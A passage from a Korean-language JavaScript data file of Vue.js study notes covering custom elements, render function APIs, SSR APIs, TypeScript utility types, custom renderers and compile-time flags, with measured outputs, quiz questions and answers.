요소\nuseShadowRoot()                      ShadowRoot | null (3.5+)                             섀도 루트\nthis.$host                           Options API 의 useHost",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Node renderToString: h('my-el', { class: 'c', someProp: { a: 1 }, onspeak }) → <my-el class=\"c\"></my-el>. 대시 태그는 컴포넌트 해석 없이 네이티브(커스텀 엘리먼트)로 취급되고 class는 className 변환 없이 그대로, 객체 prop은 HTML 속성으로 직렬화되지 않습니다(클라이언트에서 프로퍼티). JavaScript 노드 26장: customElements.define한 요소의 생명주기 constructor → attributeChanged → connectedCallback, 섀도 DOM이 바깥 CSS와 안쪽 CSS를 서로 막고(CSS 변수·::part만 통과), 바깥 querySelector가 안을 못 보고, 이벤트는 넘되 target이 호스트로 바뀌며 커스텀 이벤트는 composed: true여야 넘음. defineCustomElement가 만든 요소도 그 규칙 위에 있습니다. 자세한 맥락은 Vue와 웹 컴포넌트 노드.",
        code: "h('my-el', { class: 'c', someProp: {…}, onspeak }) → <my-el class=\"c\"></my-el>   (SSR · 객체 prop · 리스너는 HTML 에 X)\n섀도 DOM (JS 노드 26장): CSS 양방향 차단 (변수 · ::part 통과) · querySelector 차단 · target 재지정 · composed 필요",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 옵션은 '섀도 루트를 두나(격리) · 그 안에 무엇을 넣나(styles · nonce) · 내부 앱을 어떻게 꾸미나(configureApp)' 이고, 헬퍼는 안에서 바깥(호스트)을 잡는 손잡이다",
        body: "커스텀 엘리먼트는 안에 Vue 앱 하나를 돌리는 네이티브 요소입니다. shadowRoot가 격리의 스위치이고(끄면 전역 CSS가 들어오되 격리도 사라짐), styles·nonce는 격리된 안에 CSS를 넣는 길, configureApp은 그 내부 앱이 소비 앱과 별개라는 사실의 처방(플러그인·provide를 따로 설치). useHost·useShadowRoot는 안에서 자기 호스트·루트를 만져야 할 때(크기 측정, 속성 반영)의 손잡이입니다.",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '렌더 함수 API'는 h와 여덟 보조 함수입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 커스텀 엘리먼트 안에서 소비 앱의 Pinia 스토어를 쓰려 합니다. (2) 소비 사이트의 전역 CSS 리셋이 요소 안에 적용되길 원합니다. (3) CSP가 인라인 <style>을 막습니다.",
        notes: [
          {
            title: "답",
            body: "(1) 요소 내부 앱은 소비 앱과 별개라 소비 앱의 app.use(pinia)가 닿지 않습니다. defineCustomElement(Comp, { configureApp(app) { app.use(createPinia()) } })(3.5+)로 내부 앱에 따로 설치합니다. 소비 앱과 상태를 공유해야 하면 모듈 수준의 스토어 인스턴스를 둘이 같이 import하게 하거나 속성·이벤트로 주고받습니다. (2) 기본 shadowRoot: true면 바깥 CSS가 안으로 들어오지 않습니다(JS 노드 측정). 3.5+ shadowRoot: false로 섀도 루트 없이 렌더하면 전역 CSS가 적용되되 요소 스타일의 격리도 사라져 styles 옵션이 전역에 영향을 줍니다. 격리를 유지하면서 토큰만 쓰려면 CSS 변수(var(--brand))가 경계를 넘습니다. (3) 3.5+ nonce 옵션으로 주입되는 <style> 태그에 nonce를 붙여 CSP의 style-src 'nonce-…'와 맞춥니다. 서버가 요청마다 nonce를 만들어 넘기는 구조여야 합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Custom Elements API", href: `${DOCS}/api/custom-elements` },
      { label: "Vue and Web Components", href: `${DOCS}/guide/extras/web-components` },
    ],
  },

  {
    id: "va-adv-render-fn",
    name: "렌더 함수 API",
    tagline: "h · mergeProps · cloneVNode · isVNode · resolveComponent · resolveDirective · withDirectives · withModifiers",
    intro:
      "참고서 렌더 함수 API 페이지입니다. 여덟. h(type, props?, children?) → VNode(컴포넌트 자식은 슬롯 함수. props 자리 null 뒤 슬롯 객체). mergeProps(...objs)(class·style·onXxx는 특수 병합. 같은 리스너는 배열로). cloneVNode(vnode, extraProps?)(vnode는 불변으로 다룰 것). isVNode(value). resolveComponent(name)(등록 컴포넌트를 이름으로. setup·render 안에서. 없으면 경고와 이름 문자열 반환). resolveDirective(name)(없으면 undefined와 경고). withDirectives(vnode, [[dir, value, arg, modifiers]]). withModifiers(fn, ['stop', 'prevent', …])(v-on 수식어). 실제로 돌려 보면 이 블로그의 측정이 전부 h()였고(슬롯은 함수 객체, props 자리 null), resolveComponent('Nope')은 'Failed to resolve component: Nope'와 <Nope></Nope>, 컴파일된 템플릿의 v-dir·v-model이 withDirectives(vnode, [[dir, value, arg, mods]]) 꼴이었습니다. 이 노드의 질문은 하나입니다. 여덟의 시그니처는 무엇인가.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "함수                             시그니처 → 반환                                       세부\nh(type, props?, children?)       VNode                                                 type: string | Component · children: string | VNode | [] | { slot: fn } · 컴포넌트 슬롯은 함수 · null props 뒤 슬롯 객체\nmergeProps(...objs)              object                                                class 병합 · style 병합 · onXxx 같은 이름 → 배열\ncloneVNode(vnode, extraProps?)   VNode                                                 vnode 는 불변으로 · 복제해 props 추가\nisVNode(value)                   boolean\nresolveComponent(name)           Component | string                                     등록 컴포넌트 · setup/render 안 · 없으면 경고 + 이름 반환 (네이티브 요소)\nresolveDirective(name)           Directive | undefined                                   없으면 경고 + undefined\nwithDirectives(vnode, dirs)      VNode                                                 dirs: [[Directive, value?, arg?, modifiers?]]\nwithModifiers(fn, modifiers)     Function                                              ['stop', 'prevent', 'self', 'ctrl', 'exact', …] · .capture/.once/.passive 는 onClickCapture 등",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Node·Chrome의 측정 코드가 h()였습니다. h(Suspense, null, { default: () => h(AsyncChild), fallback: () => h('i', '로딩…') }), h(Teleport, { to: '#modal' }, …), h(KeepAlive, …), defineComponent({ setup() { return () => h('p', …) } }). h(resolveComponent('Nope')) → '[Vue warn]: Failed to resolve component: Nope' + <Nope></Nope>(이름 문자열이 반환되어 네이티브 요소로). 컴파일 출력: 템플릿 v-model → _withDirectives(_createElementVNode('input', {…}), [[_vModelText, _ctx.v, void 0, { trim: true, number: true }]]), 템플릿 컴포넌트 → _resolveComponent(\"Comp\") 뒤 _createVNode(_component_Comp, { title, 'onUpdate:title': … }, null, 8, [\"title\", …]). 손 h()에는 패치 플래그가 없습니다. vnode 객체는 { type, props, children, key, … }. 자세한 맥락은 렌더 함수와 JSX·렌더링 메커니즘 노드.",
        code: "h(Suspense, null, { default: () => …, fallback: () => … })   // 슬롯 = 함수 객체 · props null\nh(resolveComponent('Nope'))  → warn Failed to resolve component: Nope · <Nope></Nope>\n컴파일: _withDirectives(vnode, [[_vModelText, v, void 0, { trim, number }]]) · _resolveComponent(\"Comp\") · 플래그 8 PROPS\n손 h(): 플래그 없음",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 여덟은 '컴파일러가 템플릿에서 만들어 내는 호출' 을 손으로 쓸 수 있게 노출한 것이다",
        body: "템플릿의 태그 → h/createVNode, 등록 이름 → resolveComponent/resolveDirective, 디렉티브 → withDirectives, 수식어 → withModifiers·onXxxCapture, 폴스루 병합 → mergeProps, 요소 재사용 → cloneVNode(vnode는 유일해야). 컴파일된 템플릿의 출력이 바로 이 함수들의 호출(+패치 플래그)이고, 손으로 쓰면 플래그만 빠집니다.",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 'SSR API'는 서버 렌더 함수 여섯과 컨텍스트·불일치 허용입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 래퍼 컴포넌트가 받은 attrs와 자기 class를 합쳐 자식 vnode에 넘기려 합니다. (2) 슬롯으로 받은 vnode에 class를 더해 두 번 렌더하려 합니다. (3) 렌더 함수에서 @click.stop.prevent를 쓰려면?",
        notes: [
          {
            title: "답",
            body: "(1) h(Child, mergeProps(attrs, { class: 'wrapper', onClick: own }))로 병합합니다. mergeProps는 class·style을 합치고 같은 이름 onClick이 둘이면 배열로 둘 다 호출되게 만듭니다(단순 spread는 덮어씀). (2) const [vnode] = slots.default(); h('div', [cloneVNode(vnode, { class: 'a' }), cloneVNode(vnode, { class: 'b' })]). 같은 vnode 객체를 두 번 넣으면 안 되고(유일성) cloneVNode로 복제해 extraProps를 더합니다. vnode는 불변으로 다룹니다. (3) h('a', { onClick: withModifiers(handler, ['stop', 'prevent']) }). 수식어 순서대로 배열에 적습니다(템플릿의 .prevent.self vs .self.prevent 순서 규칙이 그대로). .capture·.once·.passive는 리스너 등록 옵션이라 withModifiers가 아니라 onClickCapture·onClickOnce·onClickPassive 프로퍼티 이름으로.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Render Function APIs", href: `${DOCS}/api/render-function` },
      { label: "Render Functions & JSX", href: `${DOCS}/guide/extras/render-function` },
    ],
  },

  {
    id: "va-adv-ssr",
    name: "SSR API",
    tagline: "renderToString · renderToNodeStream · pipeToNodeWritable · renderToWebStream · pipeToWebWritable · renderToSimpleStream · useSSRContext · data-allow-mismatch",
    intro:
      "참고서 SSR API 페이지입니다. vue/server-renderer에서 import. renderToString(input, context?) → Promise<string>. renderToNodeStream(input, context?) → Node Readable(ESM 빌드에서는 미지원. pipeToNodeWritable로). pipeToNodeWritable(input, context, writable). renderToWebStream(input, context?) → Web ReadableStream(전역 ReadableStream 없는 환경은 pipeToWebWritable). pipeToWebWritable(input, context, writable). renderToSimpleStream(input, context, { push, destroy })(push(null)이 끝). useSSRContext<T>() → 렌더 호출에 넘긴 context 객체(SSR 중에만. import.meta.env.SSR로 가드). data-allow-mismatch 속성(3.5+. 값 text·children·class·style·attribute. 값 없으면 전부 허용). 실제로 돌려 보면 renderToString이 완성 HTML, renderToWebStream은 작은 트리를 한 청크로, useSSRContext로 ctx.title을 적으니 호출 쪽 ctx에서 읽혔고, ctx.teleports에 Teleport 내용, Suspense는 기다려 렌더, 하이드레이션 불일치는 'Hydration text content mismatch' 경고와 함께 클라이언트 값으로 고쳐지되 data-allow-mismatch=\"text\" 요소는 경고 없음. 이 노드의 질문은 하나입니다. 여덟의 시그니처와 어디서 쓰나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "항목                                    시그니처                                          세부\nrenderToString(input, context?)          Promise<string>                                    input: App | VNode · context 에 teleports · useSSRContext 값\nrenderToNodeStream(input, context?)      Node Readable                                      ESM 빌드 X → pipeToNodeWritable\npipeToNodeWritable(input, context, w)    void                                               Node Writable 로\nrenderToWebStream(input, context?)       Web ReadableStream                                 전역 ReadableStream 없으면 pipeToWebWritable\npipeToWebWritable(input, context, w)     void                                               Web WritableStream 으로\nrenderToSimpleStream(input, ctx, opts)   void                                               opts { push(chunk | null), destroy(err) } · push(null) = 끝\nuseSSRContext<T>()                       T | undefined                                      렌더 호출의 context · SSR 중만 (import.meta.env.SSR 가드)\ndata-allow-mismatch                      속성 (3.5+)                                        값: text · children · class · style · attribute · 없으면 전부",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Node(@vue/server-renderer 3.5.45): renderToString(createSSRApp(App), ctx) → '<div><p id=\"v-0\">주입됨</p><!--teleport start--><!--teleport end--><b>비동기 도착</b></div>', ctx.teleports = { '#modal': '<!--teleport start anchor--><span>텔레포트</span><!--teleport anchor-->' }, useSSRContext()로 ctx.title = '제목' → 호출 쪽에서 읽힘. Suspense 안 async setup(15ms) 기다려 <b>비동기 도착</b>. renderToWebStream(작은 트리) → 1청크 '<div><p>a</p><p>b</p></div>'. 요청마다 createSSRApp해도 모듈 전역 reactive는 공유(shared 1 → 2). 서버 watchEffect runs 1(추적 꺼짐), 돈 훅 serverPrefetch만. Chrome: 서버 HTML과 다른 텍스트를 createSSRApp으로 mount → '[Vue warn]: Hydration text content mismatch on …' ×2, 'Hydration completed but contains mismatches.', DOM은 클라이언트 값, data-allow-mismatch=\"text\" span은 경고 없음. 자세한 맥락은 SSR·상태 관리·Teleport·Suspense 노드.",
        code: "renderToString(app, ctx) → 완성 HTML · ctx.teleports · ctx.title (useSSRContext) · Suspense 기다림\nrenderToWebStream → 1 chunk (작은 트리)\n요청마다 createSSRApp · 모듈 전역 공유 (1 → 2) · 서버 추적 꺼짐 (runs 1) · serverPrefetch 만\n하이드레이션: Hydration text content mismatch ×2 · Hydration completed but contains mismatches. · data-allow-mismatch=\"text\" → 경고 없음",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 여섯 렌더 함수는 '같은 렌더를 어느 출력 모양(문자열 · Node 스트림 · Web 스트림 · 콜백)으로 받나' 이고, context 는 렌더 중 쌓인 부산물(teleports · 사용자 값)의 그릇이다",
        body: "renderToString은 전부 끝난 문자열, *Stream 계열은 조각으로 흘려보내기(환경별 Node/Web/콜백), pipe* 계열은 주어진 writable에 쓰기. 어느 쪽이든 input은 앱 또는 vnode이고 context 객체에 Teleport 내용(teleports)과 useSSRContext로 적은 값이 모여 호출 쪽이 HTML 템플릿에 끼웁니다. data-allow-mismatch는 서버 출력과 클라이언트 첫 렌더가 불가피하게 다른 요소를 표시해 경고와 복구를 건너뛰는 3.5의 장치입니다. React의 renderToString/renderToPipeableStream·prerender와 같은 자리이되 Vue는 renderToString이 Suspense를 기다립니다(실제로 확인).",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '유틸리티 타입'은 PropType·MaybeRef 등 TS 타입 아홉입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 컴포넌트 안에서 서버 응답 헤더(status)를 바꾸고 싶습니다. (2) Teleport 내용이 서버 HTML에 없습니다. (3) 사용자 시간대 글자가 매번 불일치 경고입니다.",
        notes: [
          {
            title: "답",
            body: "(1) 컴포넌트는 응답 객체를 모르지만 useSSRContext()로 렌더 호출에 넘긴 context 객체에 적을 수 있습니다. 서버 핸들러가 const ctx = {}; const html = await renderToString(app, ctx); res.status(ctx.status ?? 200)처럼 읽습니다(실제로 ctx.title이 호출 쪽에서 읽힘). import.meta.env.SSR로 가드해 클라이언트에서는 부르지 않습니다. 스트리밍이면 헤더가 이미 나갔을 수 있으니 셸 전에 정해야 합니다. (2) 설계입니다. Teleport 내용은 본문 문자열에 들어가지 않고 ctx.teleports[selector]에 모입니다(실제로 '#modal' 키). 서버 HTML 템플릿에서 그 선택자 자리에 ctx.teleports['#modal']을 끼워 넣고, 클라이언트도 같은 타깃으로 하이드레이션합니다. Nuxt는 자동이고, 직접 하면 body 타깃을 피합니다. (3) 원인을 고칠 수 없는 환경 차이(사용자 시간대는 서버가 모름)면 3.5+ data-allow-mismatch=\"text\"를 그 요소에 둡니다(실제로 경고 없음). 전역이 아니라 요소 단위로만. 더 나은 길은 시간대를 쿠키로 서버에 알리거나 클라이언트 전용(onMounted 뒤) 렌더입니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Server-Side Rendering API", href: `${DOCS}/api/ssr` },
      { label: "Server-Side Rendering (Guide)", href: `${DOCS}/guide/scaling-up/ssr` },
    ],
  },

  {
    id: "va-adv-utility-types",
    name: "TS 유틸리티 타입",
    tagline: "PropType · MaybeRef · MaybeRefOrGetter · ExtractPropTypes · ExtractPublicPropTypes · ComponentCustomProperties · ComponentCustomOptions · ComponentCustomProps · CSSProperties",
    intro:
      "참고서 유틸리티 타입 페이지입니다. 아홉. PropType<T>(런타임 prop 선언의 type을 TS에서 T로 좁힘. type: Object as PropType<Book>). MaybeRef<T>(3.3+. T | Ref<T>). MaybeRefOrGetter<T>(3.3+. T | Ref<T> | (() => T). toValue 짝). ExtractPropTypes<T>(런타임 props 객체 → 컴포넌트 내부가 보는 props 타입. Boolean·default 있는 것은 필수). ExtractPublicPropTypes<T>(3.3+. 부모가 넘기는 쪽 타입. 선택). ComponentCustomProperties(globalProperties 증강. $http 등), ComponentCustomOptions(커스텀 옵션 증강. beforeRouteEnter), ComponentCustomProps(TSX 허용 props 증강), CSSProperties(style 값 증강. 커스텀 프로퍼티 [key: `--${string}`]). '증강은 모듈 .ts·.d.ts 파일에'. 측정은 타입 전용이라 없고, compileScript가 타입 선언을 런타임으로 바꾸는 것(TS 노드)과 v-bind() in CSS가 CSSProperties 증강을 대신한다는 문서의 언급을 참고합니다. 이 노드의 질문은 하나입니다. 아홉은 어느 자리의 타입을 채우나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "타입                             뜻                                                         자리\nPropType<T>                       런타임 type 을 TS 의 T 로                                      props: { book: Object as PropType<Book> }\nMaybeRef<T>  (3.3+)               T | Ref<T>                                                  컴포저블 입력 (unref)\nMaybeRefOrGetter<T>  (3.3+)       T | Ref<T> | (() => T)                                      컴포저블 입력 (toValue)\nExtractPropTypes<T>               런타임 props → 내부 props 타입 (Boolean·default 는 필수)             setup(props) · this.$props\nExtractPublicPropTypes<T> (3.3+)  런타임 props → 부모 쪽 타입 (선택)                                컴포넌트 사용 쪽\nComponentCustomProperties         this · 템플릿 전역 프로퍼티 증강                                   declare module 'vue' { interface ComponentCustomProperties { $http: … } }\nComponentCustomOptions            커스텀 컴포넌트 옵션 증강                                        beforeRouteEnter?(…)\nComponentCustomProps              TSX 에서 허용할 props 증강\nCSSProperties                     style 바인딩 값 증강                                           [key: `--${string}`]: string  (v-bind() in CSS 가 대안)\n\n증강은 모듈 파일 (.ts · .d.ts · import/export 하나 필수)",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면: 타입이 런타임이 되는 자리",
        body: "타입 자체는 측정 대상이 아니고, 타입과 런타임이 만나는 자리만 확인했습니다. compileScript가 defineProps<{ msg?: string; count: number }>()를 { msg: { type: String, required: false }, count: { type: Number, required: true } }로 바꿨습니다. 이것이 ExtractPropTypes가 '내부 props 타입'을 만드는 입력(런타임 선언)이고, PropType은 그 역방향(런타임 선언에 TS 타입 얹기)입니다. toValue(() => 4) → 4, unref(ref(3)) → 3이 MaybeRefOrGetter·MaybeRef의 런타임 짝입니다. 템플릿 전역 허용 목록 밖(window 등)이 undefined였고 globalProperties로 열면 보이는데, 그 타입이 ComponentCustomProperties입니다. v-bind(size) → var(--abc123-size)로 컴파일되어 CSS 변수 타입 증강 없이도 동적 스타일이 됩니다.",
        code: "defineProps<{ msg?: string; count: number }>() → { msg: { type: String, required: false }, count: { type: Number, required: true } }   (ExtractPropTypes 의 입력 · PropType 의 역방향)\ntoValue(() => 4) → 4 (MaybeRefOrGetter) · unref(ref(3)) → 3 (MaybeRef)\n템플릿 전역: window undefined → globalProperties 로 열면 ✓ → 타입은 ComponentCustomProperties\nv-bind(size) → var(--abc123-size)   (CSSProperties 증강 대신)",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 아홉은 'Vue 가 모르는 타입을 Vue 의 자리에 끼우는' 접점이고, 둘로 갈린다",
        body: "좁히기/정규화 다섯(PropType·MaybeRef·MaybeRefOrGetter·ExtractPropTypes·ExtractPublicPropTypes)은 런타임 선언과 TS 타입 사이를 오가는 변환이고, 증강 넷(ComponentCustomProperties·ComponentCustomOptions·ComponentCustomProps·CSSProperties)은 Vue의 인터페이스에 내 것(플러그인 전역, 라우터 옵션, TSX props, CSS 변수)을 더하는 선언 병합입니다. 증강은 모듈 파일에 두어야 병합이고, 아니면 덮어씀(TS Options 노드).",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '커스텀 렌더러'는 DOM 밖에 렌더하는 createRenderer입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 컴포저블 인자 타입을 ref·getter·값 모두 받게. (2) 라이브러리가 export한 컴포넌트의 '부모가 넘길 props 타입'이 필요합니다. (3) :style에 '--gap': '8px'를 넣으니 타입 에러입니다.",
        notes: [
          {
            title: "답",
            body: "(1) function useFetch(url: MaybeRefOrGetter<string>)로 선언하고 안에서 toValue(url)로 읽습니다(3.3+. 실제로 toValue가 getter를 풂). ref만 받으면 MaybeRef<string> + unref. 컴포저블 노드의 입력 관례입니다. (2) ExtractPublicPropTypes<typeof propsOptions>(3.3+)입니다. ExtractPropTypes는 내부용(Boolean·default가 있는 prop이 필수로 보임)이라 부모 쪽에서 쓰면 선택 prop을 필수로 요구합니다. 컴포넌트 타입에서 바로 뽑으려면 InstanceType<typeof Comp>['$props']. (3) CSSProperties 증강으로 커스텀 프로퍼티를 허용합니다. declare module 'vue' { interface CSSProperties { [key: `--${string}`]: string } }를 모듈 .d.ts에 두면 '--gap'이 통과합니다. 문서는 대안으로 <style>에서 v-bind()를 쓰면 증강 없이 동적 값이 된다고 적습니다(실제로 var(--hash-name)으로 컴파일).",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Utility Types", href: `${DOCS}/api/utility-types` },
      { label: "TypeScript with Composition API", href: `${DOCS}/guide/typescript/composition-api` },
    ],
  },

  {
    id: "va-adv-custom-renderer",
    name: "커스텀 렌더러",
    tagline: "createRenderer(nodeOps) → { render, createApp }: DOM 이 아닌 곳(캔버스 · 터미널 · 네이티브)에 같은 런타임을",
    intro:
      "참고서 커스텀 렌더러 페이지입니다. createRenderer<HostNode, HostElement>(options) → { render, createApp }. Vue의 런타임 코어(@vue/runtime-core)는 DOM을 모르고 '노드 조작 함수 묶음'만 요구합니다. 필수: patchProp(el, key, prev, next, …), insert(el, parent, anchor?), remove(el), createElement(type, …), createText(text), createComment(text), setText(node, text), setElementText(el, text), parentNode(node), nextSibling(node). 선택: querySelector, setScopeId, cloneNode, insertStaticContent. @vue/runtime-dom이 DOM 구현이고 @vue/runtime-test가 참고 구현. 측정은 없고(DOM 밖 렌더를 만들지 않았음), 이 블로그의 모든 Chrome 측정이 runtime-dom의 nodeOps 위에서 돌았으며, Node의 server-renderer는 렌더러가 아니라 문자열 생성기라는 점이 대비됩니다. 사용 방법 노드의 vue-termui(터미널)·TresJS(WebGL)가 이 API의 사례입니다. 이 노드의 질문은 하나입니다. 런타임이 '호스트'에 요구하는 최소 인터페이스는 무엇인가.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "createRenderer<HostNode, HostElement>(options: RendererOptions) → { render, createApp }\n필수 nodeOps                       뜻\npatchProp(el, key, prev, next, …)   prop/속성/이벤트 하나를 호스트 요소에 적용\ninsert(el, parent, anchor?)         anchor 앞에 삽입\nremove(el)                          제거\ncreateElement(type, …)              호스트 요소 생성\ncreateText(text) · createComment(text)   텍스트 · 주석 노드\nsetText(node, text) · setElementText(el, text)   텍스트 갱신\nparentNode(node) · nextSibling(node)     트리 탐색\n선택: querySelector · setScopeId · cloneNode · insertStaticContent\n참고 구현: @vue/runtime-dom (DOM) · @vue/runtime-test",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면: 이 블로그의 측정이 선 자리",
        body: "커스텀 렌더러를 만들지는 않았습니다. Chrome 측정의 전부(마운트·패치·Transition 클래스·Teleport 이동)는 @vue/runtime-dom의 nodeOps(document.createElement·insertBefore·removeChild·setAttribute·addEventListener…)로 실행된 것이고, 반응성·컴포넌트·슬롯·KeepAlive 같은 코어 동작은 호스트와 무관합니다. Node의 @vue/server-renderer는 createRenderer가 아니라 vnode를 문자열로 바꾸는 별도 경로라 DOM 훅이 돌지 않았습니다(mounted X). 렌더 함수 노드의 h()가 만드는 vnode는 호스트 중립이고, createRenderer가 받는 nodeOps가 그 vnode를 호스트에 그리는 방법입니다.",
        code: "코어 (호스트 중립): 반응성 · 컴포넌트 · 슬롯 · KeepAlive · Suspense · vnode(h)\n  ├ runtime-dom (nodeOps = DOM API)    ← Chrome 측정 전부\n  ├ server-renderer (vnode → 문자열)   ← Node 측정 (DOM 훅 X)\n  └ createRenderer(내 nodeOps)         ← 터미널 (vue-termui) · WebGL (TresJS) · 네이티브",
        codeLang: "text",
      },
      {
        label: "문제의 구조: Vue 런타임은 '무엇을 그릴지(코어)' 와 '어디에 그릴지(nodeOps)' 를 가르고, 커스텀 렌더러는 후자만 바꾼다",
        body: "React의 react/react-dom 분리와 같은 자리입니다. 코어는 vnode 트리를 만들고 diff해 '이 노드를 저기 넣어라, 이 prop을 바꿔라' 같은 명령을 nodeOps에 내립니다. nodeOps가 DOM이면 웹, 터미널 버퍼면 TUI, 3D 씬이면 WebGL. 그래서 컴포넌트·반응성·슬롯은 그대로 재사용되고 호스트 쪽만 구현합니다. 문서가 '일반적인 용도는 아니다'라고 적는 고급 API입니다.",
      },
      {
        label: "다음 입구",
        body: "고급 API의 마지막 '컴파일 타임 플래그'는 esm-bundler 빌드의 세 플래그입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 캔버스에 도형을 Vue 컴포넌트로 그리려 합니다. 어디서 시작? (2) 커스텀 렌더러에서 <Transition>이 될까요? (3) 서버 렌더러도 createRenderer로 만든 건가요?",
        notes: [
          {
            title: "답",
            body: "(1) createRenderer({ createElement: (type) => ({ type, children: [] }), insert, remove, patchProp: (el, key, _, next) => el[key] = next, … })처럼 '씬 그래프' 객체를 호스트 노드로 두고, 변경이 있을 때 캔버스에 전체를 다시 그리는 draw 루프를 붙입니다. @vue/runtime-test의 구현이 가장 작은 참고입니다. 컴포넌트·반응성은 그대로 쓰고 템플릿에 <circle :x :y>처럼 씁니다. TresJS(three.js)가 이 패턴입니다. (2) Transition·TransitionGroup은 DOM 클래스·transitionend에 의존하는 runtime-dom 전용이라 커스텀 렌더러에는 없습니다(코어에는 BaseTransition만). KeepAlive·Teleport·Suspense는 코어라 됩니다(Teleport는 호스트의 querySelector·insert 구현 필요). (3) 아닙니다. @vue/server-renderer는 vnode를 문자열로 직렬화하는 별도 경로(ssrRender)이고 nodeOps를 쓰지 않습니다. 그래서 서버에서 DOM 훅이 돌지 않고(실제로 serverPrefetch만) 템플릿도 SSR 전용으로 컴파일됩니다(문자열 연결 최적화).",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Custom Renderer API", href: `${DOCS}/api/custom-renderer` },
      { label: "@vue/runtime-dom nodeOps", href: "https://github.com/vuejs/core/blob/main/packages/runtime-dom/src/nodeOps.ts" },
    ],
  },

  {
    id: "va-adv-compile-flags",
    name: "컴파일 타임 플래그",
    tagline: "__VUE_OPTIONS_API__ · __VUE_PROD_DEVTOOLS__ · __VUE_PROD_HYDRATION_MISMATCH_DETAILS__ — esm-bundler 빌드에서만",
    intro:
      "참고서 컴파일 타임 플래그 페이지입니다. '플래그는 esm-bundler 빌드를 쓸 때만 적용'. 셋. __VUE_OPTIONS_API__(기본 true. false면 Options API 지원 코드 제거로 번들 축소. Options API에 의존하는 서드파티가 깨질 수 있음). __VUE_PROD_DEVTOOLS__(기본 false. 운영에서 DevTools 지원). __VUE_PROD_HYDRATION_MISMATCH_DETAILS__(기본 false. 3.4+. 운영에서 하이드레이션 불일치 상세 경고). 설정: Vite는 @vitejs/plugin-vue가 기본값을 넣고 define으로 덮음, vue-cli는 chainWebpack의 DefinePlugin, webpack은 DefinePlugin, Rollup은 @rollup/plugin-replace. 실제로 돌려 보면 브라우저 빌드 크기 개발 575,931 vs 운영 177,765바이트(플래그와 NODE_ENV 치환이 제거하는 양의 감), 하이드레이션 불일치는 개발 빌드에서 'Hydration text content mismatch' 상세가 나왔고 운영에서는 플래그 없이 안 보입니다. 이 노드의 질문은 하나입니다. 세 플래그는 무엇을 넣고 빼나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "플래그                                       기본      뜻                                                      주의\n__VUE_OPTIONS_API__                           true      Options API 지원 코드 포함                                  false → 번들 축소 · Options 쓰는 서드파티 깨짐\n__VUE_PROD_DEVTOOLS__                         false     운영 빌드에서 DevTools 지원                                 true → 운영 디버깅 · 비용\n__VUE_PROD_HYDRATION_MISMATCH_DETAILS__       false     운영에서 불일치 상세 경고 (3.4+)                              true → 운영 SSR 진단 · 비용\n\n적용: esm-bundler 빌드만 (vue.esm-bundler.js · vue.runtime.esm-bundler.js)\n설정: Vite define · vue-cli chainWebpack DefinePlugin · webpack DefinePlugin · Rollup @rollup/plugin-replace",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "플래그 자체를 바꿔 빌드하지는 않았습니다. 관련 측정: 브라우저 빌드 vue.esm-browser.js(개발) 575,931바이트 vs vue.esm-browser.prod.js(운영) 177,765바이트. 개발 빌드가 낸 하이드레이션 불일치 상세 '[Vue warn]: Hydration text content mismatch on …'와 'Hydration completed but contains mismatches.'는 운영 빌드에서는 __VUE_PROD_HYDRATION_MISMATCH_DETAILS__ 없이는 상세가 빠집니다. Options API 컴포넌트({ data, template })와 Composition 컴포넌트가 같은 런타임에서 동작했으므로 __VUE_OPTIONS_API__를 끄면 전자가 깨집니다. 자세한 맥락은 프로덕션 배포·SSR·FAQ 노드.",
        code: "빌드 크기: 개발 575,931 B · 운영 177,765 B   (플래그 + NODE_ENV 치환이 빼는 양의 감)\n불일치 상세: 개발 'Hydration text content mismatch on …' · 운영은 __VUE_PROD_HYDRATION_MISMATCH_DETAILS__ 없이는 X\nOptions 컴포넌트 동작 ✓ → __VUE_OPTIONS_API__ false 면 깨짐",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 플래그는 '런타임에 둘 수도 뺄 수도 있는 코드' 의 포함 여부를 빌드 때 상수로 정해 압축기가 제거하게 하는 것이다",
        body: "process.env.NODE_ENV 치환과 같은 메커니즘입니다. Vue 소스의 if (__VUE_OPTIONS_API__) { … }가 상수 거짓이 되면 그 블록이 번들에서 사라집니다. 번들러가 전역 상수를 치환할 수 있어야 하므로 esm-bundler 빌드에서만 뜻이 있고(CDN 빌드는 이미 결정됨), 기본값은 '호환은 넓게(Options 포함), 운영 진단은 끄기'입니다. 프로덕션 배포 노드의 '검사를 빼고 속도를 얻는 거래'의 세부 손잡이입니다.",
      },
      {
        label: "다음 입구",
